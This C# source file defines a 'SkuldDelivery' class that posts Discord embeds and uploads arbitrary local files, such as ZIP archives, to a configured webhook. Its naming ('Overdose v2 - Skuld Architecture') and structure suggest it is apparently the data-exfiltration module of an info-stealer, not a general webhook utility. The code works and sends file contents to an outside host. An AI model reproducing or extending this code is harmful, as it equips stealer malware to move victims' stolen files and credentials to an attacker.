using System;
using System.IO;
using System.Net.Http;
using System.Text;
using Newtonsoft.Json;

namespace OdPS.Utils
{
    public static class SkuldDelivery
    {
        /// <summary>
        /// Envoie un message structuré (Embed) avec support de miniature (Avatar).
        /// </summary>
        public static void SendEmbed(string title, string description, object[] fields, string thumbnailUrl = null)
        {
            using (var client = new HttpClient())
            {
                var embed = new
                {
                    title = title,
                    description = description,
                    color = Config.SkuldColor,
                    fields = fields,
                    // Si thumbnailUrl est fourni, on l'ajoute à l'objet 'thumbnail' de Discord
                    thumbnail = !string.IsNullOrEmpty(thumbnailUrl) ? new { url = thumbnailUrl } : null,
                    footer = new { text = "Overdose v2 - Skuld Architecture" }
                };

                var payload = new { embeds = new[] { embed } };
                var json = JsonConvert.SerializeObject(payload);
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                try
                {
                    // Utilisation de .Wait() car nous sommes dans une méthode void statique
                    client.PostAsync(Config.WebhookUrl, content).Wait();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Erreur d'envoi Embed : " + ex.Message);
                }
            }
        }

        /// <summary>
        /// Envoie un fichier physique (ZIP, Image, etc.) via Multipart FormData.
        /// </summary>
        public static void SendFile(string title, string description, string filePath)
        {
            if (!File.Exists(filePath))
            {
                Console.WriteLine("[-] Fichier introuvable : " + filePath);
                return;
            }

            try
            {
                using (var client = new HttpClient())
                {
                    using (var form = new MultipartFormDataContent())
                    {
                        // Préparation du texte qui accompagne le fichier
                        var payload = new { content = $"**{title}**\n{description}" };
                        var json = JsonConvert.SerializeObject(payload);
                        var jsonContent = new StringContent(json, Encoding.UTF8, "application/json");

                        // Discord demande le JSON dans un champ nommé 'payload_json' pour les envois de fichiers
                        form.Add(jsonContent, "payload_json");

                        // Lecture et ajout du fichier binaire
                        var fileBytes = File.ReadAllBytes(filePath);
                        var fileContent = new ByteArrayContent(fileBytes);

                        // On définit le nom du fichier pour Discord
                        string fileName = Path.GetFileName(filePath);
                        form.Add(fileContent, "file", fileName);

                        // Envoi synchrone
                        var response = client.PostAsync(Config.WebhookUrl, form).Result;

                        if (!response.IsSuccessStatusCode)
                        {
                            Console.WriteLine("[-] Échec de l'envoi du fichier : " + response.StatusCode);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Erreur SkuldDelivery (SendFile) : " + ex.Message);
            }
        }
    }
}